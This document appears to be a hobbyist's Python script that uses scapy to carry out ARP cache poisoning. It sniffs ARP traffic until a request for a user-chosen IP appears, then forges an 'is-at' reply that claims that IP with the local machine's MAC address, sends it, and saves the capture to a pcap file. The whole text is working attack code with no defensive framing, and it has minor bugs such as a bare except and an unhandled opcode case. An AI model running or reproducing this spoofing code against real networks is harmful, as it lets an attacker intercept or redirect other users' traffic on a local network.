from scapy.all import *
from getmac import get_mac_address as gma

"""
The general ideas of this script is to recieve an arp packet, send back a forged one, claiming to be the ip address we are poisoning but with a different mac
however im no networking genius nor a legitiment hacker
"""

def optype(pkt):
    if pkt.op == 1:
        op = "who-is"
    elif pkt.op == 2:
        op = "is-at"
    return op



mac = gma()
ip = input("Input the ip you want to fake: ")
try:
    while True:
        pkt = sniff(count=1, filter="arp")
        print(f"ARP packet recieved: {pkt[0].psrc} says {optype(pkt[0])} {pkt[0].pdst}" )
        if pkt[0].pdst == ip:
            break

    
except:
    print("Something went wrong.")


pkt[0].show()
pkt[0][Ether].dst = pkt[0].src
pkt[0][Ether].src = mac
pkt[0][ARP].hwdst = pkt[0][ARP].hwsrc
pkt[0][ARP].pdst = pkt[0][ARP].psrc
pkt[0][ARP].hwsrc = mac
pkt[0][ARP].psrc = ip
pkt[0][ARP].op = 2

 
wrpcap('C:/users/cohen/code/python/capture.pcap', srp(pkt[0], iface="Ethernet"))
